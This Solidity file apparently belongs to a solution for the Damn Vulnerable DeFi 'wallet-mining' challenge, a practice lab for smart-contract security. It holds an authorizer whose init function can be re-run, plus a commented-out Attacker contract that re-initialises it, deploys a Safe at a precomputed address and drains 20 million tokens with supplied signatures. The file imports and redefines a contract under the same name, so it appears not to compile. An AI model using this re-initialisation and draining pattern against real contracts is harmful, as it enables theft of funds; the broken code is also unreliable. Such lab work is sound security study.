// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Safe, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerUpgradeable.sol";

contract AuthorizerUpgradeable {
    uint256 public needsInit = 1;
    mapping(address => mapping(address => uint256)) private wards;

    event Rely(address indexed usr, address aim);

    constructor() {
        needsInit = 0; // freeze implementation
    }

    function init(address[] memory _wards, address[] memory _aims) external {
        require(needsInit != 0, "cannot init");
        for (uint256 i = 0; i < _wards.length; i++) {
            _rely(_wards[i], _aims[i]);
        }
        needsInit = 0;
    }

    function _rely(address usr, address aim) private {
        wards[usr][aim] = 1;
        emit Rely(usr, aim);
    }

    function can(address usr, address aim) external view returns (bool) {
        return wards[usr][aim] == 1;
    }
}

// contract Attacker {
//     constructor(
//         AuthorizerUpgradeable authorizer,
//         WalletDeployer deployer,
//         DamnValuableToken token,
//         bytes memory signatures,
//         address user,
//         address ward
//     ) {
//         address[] memory wards = new address[](1);
//         wards[0] = address(this);

//         address[] memory aims = new address[](1);
//         aims[0] = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
//         authorizer.init(wards, aims);

//         address[] memory owners = new address[](1);
//         owners[0] = user;

//         bytes memory initializer =
//             abi.encodeCall(Safe.setup, (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0))));
//         deployer.drop(0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496, initializer, 13);

//         Safe(payable(0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496)).execTransaction(
//             address(token),
//             0,
//             abi.encodeCall(token.transfer, (user, 20_000_000e18)),
//             Enum.Operation.Call,
//             50000,
//             0,
//             0,
//             address(0),
//             payable(0),
//             signatures
//         );
//         token.transfer(ward, 1 ether);
//     }
// }
